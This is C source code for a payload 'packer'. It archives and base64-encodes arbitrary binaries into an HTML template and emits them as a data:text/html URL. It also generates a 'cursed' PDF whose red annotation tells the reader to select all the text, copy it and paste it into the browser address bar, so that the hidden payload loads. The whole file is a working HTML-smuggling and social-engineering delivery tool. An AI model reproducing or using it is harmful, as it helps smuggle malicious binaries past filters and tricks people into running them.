#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <sys/stat.h>
#include "bithelper/bithelpers.h"
#include "gzip/gzip.h"
#include "base64encoder/b64e.h"
#include "cursedhelpers.h"
#include "base64encoder/b64tbl.h"

#ifdef BUILD_PACKER

/* Global byte tracker for XRef offsets */

static long _pdf_pos = 0;

/* Portable byte-tracking wrappers */
static void p_pdf(FILE *f, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    _pdf_pos += vfprintf(f, fmt, args);
    va_end(args);
}

static void p_bytes(FILE *f, const char *buf, size_t len) {
    _pdf_pos += fwrite(buf, 1, len, f);
}

void generate_cursed_pdf(const char *filename, const char *payload) {
    FILE *f;
    long *offsets;
    int obj_count = 1;
    size_t payload_len = strlen(payload);
    
    size_t chars_per_line = 70;  
    size_t lines_per_page = 55;  
    size_t chars_per_page = chars_per_line * lines_per_page;
    int num_pages = (payload_len + chars_per_page - 1) / chars_per_page;
    
    int i, p, line, c;
    long xref_pos;

    offsets = (long *)calloc(num_pages * 2 + 10, sizeof(long));
    if (!offsets) return;

    f = fopen(filename, "wb");
    if (!f) { free(offsets); return; }

    _pdf_pos = 0;
    p_pdf(f, "%%PDF-1.1\n");

    /* Obj 1: Catalog */
    offsets[obj_count] = _pdf_pos;
    p_pdf(f, "%d 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n", obj_count++);

    /* Obj 2: Pages Tree */
    offsets[obj_count] = _pdf_pos;
    p_pdf(f, "%d 0 obj\n<</Type/Pages/Count %d/Kids[", obj_count++, num_pages);
    /* Pages start after the Font (Obj 3) and Annotation (Obj 4) */
    for (p = 0; p < num_pages; p++) {
        p_pdf(f, "%d 0 R ", 5 + (p * 2)); 
    }
    p_pdf(f, "]>>\nendobj\n");

    /* Obj 3: Font */
    offsets[obj_count] = _pdf_pos;
    p_pdf(f, "%d 0 obj\n<</Type/Font/Subtype/Type1/BaseFont/Courier>>\nendobj\n", obj_count++);

    /* Obj 4: The "Ghost" Annotation (Visible, but ignored by Ctrl+A) */
    int annot_obj = obj_count++;
    offsets[annot_obj] = _pdf_pos;
    /* /DA dictates font color. "0.8 0 0 rg" makes it red. */
    p_pdf(f, "%d 0 obj\n<</Type/Annot/Subtype/FreeText/Rect[50 755 550 775]/Contents(HINT: Press Ctrl+A, Ctrl+C, then paste into browser address bar.)/DA(/F1 11 Tf 0.8 0 0 rg)/Border[0 0 0]>>\nendobj\n", annot_obj);

    /* Generate Pages */
    size_t payload_idx = 0;
    for (p = 0; p < num_pages; p++) {
        int page_obj = obj_count++;
        int stream_obj = obj_count++;

        offsets[page_obj] = _pdf_pos;
        
        /* The First Page gets the Annotation linked to it */
        if (p == 0) {
            p_pdf(f, "%d 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents %d 0 R/Resources<</Font<</F1 3 0 R>>>> /Annots [%d 0 R]>>\nendobj\n", page_obj, stream_obj, annot_obj);
        } else {
            p_pdf(f, "%d 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents %d 0 R/Resources<</Font<</F1 3 0 R>>>>>>\nendobj\n", page_obj, stream_obj);
        }

        /* Stream Object */
        offsets[stream_obj] = _pdf_pos;

        size_t chars_this_page = payload_len - payload_idx;
        if (chars_this_page > chars_per_page) chars_this_page = chars_per_page;
        size_t lines_this_page = (chars_this_page + chars_per_line - 1) / chars_per_line;

        char *stream_buf = (char *)malloc(chars_this_page * 2 + lines_this_page * 30 + 100);
        char *sb = stream_buf;

        /* Move to top left, just below the annotation */
        sb += sprintf(sb, "BT\n/F1 10 Tf\n50 740 Td\n");
        
        for (line = 0; line < lines_this_page && payload_idx < payload_len; line++) {
            sb += sprintf(sb, "<");
            for (c = 0; c < chars_per_line && payload_idx < payload_len; c++) {
                sb += sprintf(sb, "%02X", (unsigned char)payload[payload_idx++]);
            }
            if (line < lines_this_page - 1) sb += sprintf(sb, "> Tj\n0 -12 Td\n"); 
            else sb += sprintf(sb, "> Tj\n"); 
        }
        sb += sprintf(sb, "ET\n");

        size_t actual_len = sb - stream_buf;

        p_pdf(f, "%d 0 obj\n<</Length %lu>>\nstream\n", stream_obj, (unsigned long)actual_len);
        p_bytes(f, stream_buf, actual_len);
        p_pdf(f, "\nendstream\nendobj\n");

        free(stream_buf);
    }

    /* XRef Table & Trailer */
    xref_pos = _pdf_pos;
    p_pdf(f, "xref\n0 %d\n", obj_count);
    p_pdf(f, "0000000000 65535 f \n");
    for (i = 1; i < obj_count; i++) p_pdf(f, "%010ld 00000 n \n", offsets[i]);
    p_pdf(f, "trailer\n<</Size %d/Root 1 0 R>>\n", obj_count);
    p_pdf(f, "startxref\n%ld\n%%%%EOF\n", xref_pos);

    fclose(f);
    free(offsets);
}

static int local_remap3bytes(const unsigned char* readbytes, unsigned char* writebuffer, size_t input_size) {
    unsigned char b1, b2;
    if (input_size > 3) return 4; /* INPUT_ERROR */
    b1 = input_size > 1 ? readbytes[1] >> 4 : 0;
    b2 = input_size > 2 ? readbytes[2] >> 6 : 0;
    writebuffer[0] = B64URL_TABLE[readbytes[0] >> 2];
    writebuffer[1] = B64URL_TABLE[((readbytes[0] & 3) << 4) | b1];
    writebuffer[2] = input_size > 1 ? B64URL_TABLE[((readbytes[1] & 15) << 2) | b2] : B64PAD;
    writebuffer[3] = input_size > 2 ? B64URL_TABLE[readbytes[2] & 63] : B64PAD;
    return 1; /* OK */
}

static void local_getb64size(long fsize, long* bsize_out, long* remainder_out, long* blocks_out) {
    *remainder_out = fsize % 3;
    *blocks_out = fsize / 3 + (*remainder_out > 0 ? 1 : 0);
    /* Total size including null terminator */
    *bsize_out = fsize / 3 * 4 + (fsize % 3 > 0 ? 4 : 0) + 1;
}

/* The signature your pipeline expects */
int b64_encode(const unsigned char* in, size_t in_size, unsigned char* out, size_t* out_size) {
    long bsize, remainder, blocks;
    size_t i;
    
    local_getb64size((long)in_size, &bsize, &remainder, &blocks);
    
    for (i = 0; i < (size_t)(in_size / 3); i++) {
        local_remap3bytes(&in[i * 3], &out[i * 4], 3);
    }
    
    if (remainder != 0) {
        /* Align with your driver: write to the block just before the null terminator */
        local_remap3bytes(&in[in_size - remainder], &out[bsize - 5], remainder);
    }
    
    out[bsize - 1] = '\0';
    if (out_size) *out_size = (size_t)(bsize - 1); /* Return length without null */
    return 0; /* SUCCESS in your pipeline signature */
}

/* * -----------------------------------------------------------------
 * PACKER LOGIC
 * -----------------------------------------------------------------
 */

void packer_internal_log(const char* msg) {
    fprintf(stderr, "[PACKER] %s\n", msg);
}
void (*cursed_log_callback)(const char* msg) = packer_internal_log;

void pack_tar_header(FILE* f, const char* name, size_t size) {
    unsigned char header[512];
    memset(header, 0, 512);
    strncpy((char*)header, name, 100);
    sprintf((char*)header + 124, "%011lo", (unsigned long)size);
    memcpy(header + 257, "ustar", 5);
    unsigned int sum = 0; int i;
    memset(header + 148, ' ', 8);
    for (i = 0; i < 512; i++) sum += header[i];
    sprintf((char*)header + 148, "%06o", sum);
    fwrite(header, 1, 512, f);
}

int main(int argc, char** argv) {
/* ANSI C: All variables at top */
    bitarray bData = {0};
    FILE *tar_f, *fTpl, *fUrl;
    const char* temp_tar = "temp_payload.tar";
    char *tpl_buf, *marker_pos, *final_html, *url_buf;
    unsigned char *b64_payload, *b64_final;
    size_t b64_payload_sz = 0, b64_final_sz = 0, r;
    long tpl_sz, url_sz, f_bsize, f_rem, f_blocks, p_bsize, p_rem, p_blocks;
    int i;

    /* --- MODE: PDF GENERATION --- */
    /* Usage: packer -pdf <out.pdf> <payload.txt> */
    if (argc >= 4 && strcmp(argv[1], "-pdf") == 0) {
        fUrl = fopen(argv[3], "rb");
        if (!fUrl) {
            fprintf(stderr, "Error: Could not open payload file %s\n", argv[3]);
            return 1;
        }
        fseek(fUrl, 0, SEEK_END); url_sz = ftell(fUrl); rewind(fUrl);
        url_buf = malloc(url_sz + 1);
        fread(url_buf, 1, url_sz, fUrl); url_buf[url_sz] = '\0';
        fclose(fUrl);

        generate_cursed_pdf(argv[2], url_buf);
        
        free(url_buf);
        return 0;
    }

    /* --- MODE: HTML DELIVERY PIPE --- */
    /* Usage: packer -delivery <tpl.html> <url.txt> */
    if (argc >= 4 && strcmp(argv[1], "-delivery") == 0) {
        fTpl = fopen(argv[2], "rb");
        fUrl = fopen(argv[3], "rb");
        if (!fTpl || !fUrl) {
            fprintf(stderr, "Error: Could not open template or URL file.\n");
            return 1;
        }

        fseek(fTpl, 0, SEEK_END); tpl_sz = ftell(fTpl); rewind(fTpl);
        tpl_buf = malloc(tpl_sz + 1);
        fread(tpl_buf, 1, tpl_sz, fTpl); tpl_buf[tpl_sz] = '\0';
        fclose(fTpl);

        marker_pos = strstr(tpl_buf, "{{CONTENT_OF_URL_TXT}}");
        if (!marker_pos) {
            fprintf(stderr, "Error: Marker {{CONTENT_OF_URL_TXT}} not found.\n");
            free(tpl_buf); return 1;
        }

        fwrite(tpl_buf, 1, marker_pos - tpl_buf, stdout);
        {
            char buf[8192];
            while ((r = fread(buf, 1, sizeof(buf), fUrl)) > 0) fwrite(buf, 1, r, stdout);
        }
        fclose(fUrl);
        fwrite(marker_pos + strlen("{{CONTENT_OF_URL_TXT}}"), 1, tpl_sz - (marker_pos - tpl_buf) - strlen("{{CONTENT_OF_URL_TXT}}"), stdout);

        free(tpl_buf);
        return 0;
    }

    /* --- MODE: STANDARD PACKER --- */
    if (argc < 3) {
        fprintf(stderr, "Usage:\n  %s <template.html> <bins...>\n", argv[0]);
        fprintf(stderr, "  %s -delivery <tpl.html> <url.txt>\n", argv[0]);
        fprintf(stderr, "  %s -pdf <out.pdf> <url.txt>\n", argv[0]);
        return 1;
    }

    /* 1. ARCHIVE BINARIES TO TAR */
    tar_f = fopen(temp_tar, "wb");
    if (!tar_f) return 1;
    for (i = 2; i < argc; i++) {
        struct stat st;
        if (stat(argv[i], &st) != 0) continue;
        FILE* src = fopen(argv[i], "rb");
        if (!src) continue;
        pack_tar_header(tar_f, argv[i], (size_t)st.st_size);
        unsigned char buf[8192]; size_t r;
        while ((r = fread(buf, 1, sizeof(buf), src)) > 0) fwrite(buf, 1, r, tar_f);
        size_t padding = (512 - (st.st_size % 512)) % 512;
        if (padding) { unsigned char p[512] = {0}; fwrite(p, 1, padding, tar_f); }
        fclose(src);
    }
    unsigned char eoa[1024] = {0}; fwrite(eoa, 1, 1024, tar_f);
    fclose(tar_f);

    /* 2. GZIP THE TAR */
    if (write_gzip_from_file(temp_tar, &bData) == (uint32_t)-1) return 1;
    bitarray_flush(&bData);

    /* 3. BASE64 ENCODE (INNER PAYLOAD) */
    local_getb64size((long)bData.used, &p_bsize, &p_rem, &p_blocks);
    b64_payload = malloc(p_bsize);
    b64_encode(bData.data, bData.used, b64_payload, &b64_payload_sz);

    /* 4. TEMPLATE INJECTION */
    fTpl = fopen(argv[1], "rb");
    if (!fTpl) return 1;
    fseek(fTpl, 0, SEEK_END); tpl_sz = ftell(fTpl); rewind(fTpl);
    tpl_buf = malloc(tpl_sz + 1);
    fread(tpl_buf, 1, tpl_sz, fTpl); tpl_buf[tpl_sz] = '\0';
    fclose(fTpl);

    marker_pos = strstr(tpl_buf, "__PAYLOAD__");
    if (!marker_pos) return 1;

    size_t head_len = marker_pos - tpl_buf;
    size_t tail_len = tpl_sz - head_len - strlen("__PAYLOAD__");
    size_t final_html_sz = head_len + b64_payload_sz + tail_len;
    final_html = malloc(final_html_sz + 1);

    memcpy(final_html, tpl_buf, head_len);
    memcpy(final_html + head_len, b64_payload, b64_payload_sz);
    memcpy(final_html + head_len + b64_payload_sz, marker_pos + strlen("__PAYLOAD__"), tail_len);
    final_html[final_html_sz] = '\0';

    /* 5. FINAL BASE64 (DATA URL) */
    local_getb64size((long)final_html_sz, &f_bsize, &f_rem, &f_blocks);
    b64_final = malloc(f_bsize);
    
    if (b64_encode((unsigned char*)final_html, final_html_sz, b64_final, &b64_final_sz) == 0) {
        printf("data:text/html;base64,");
        fwrite(b64_final, 1, b64_final_sz, stdout);
        printf("\n");
    }

    /* CLEANUP */
    remove(temp_tar);
    free(b64_payload); free(b64_final);
    free(tpl_buf); free(final_html);
    if (bData.data) free(bData.data);
    
    return 0;
}
#endif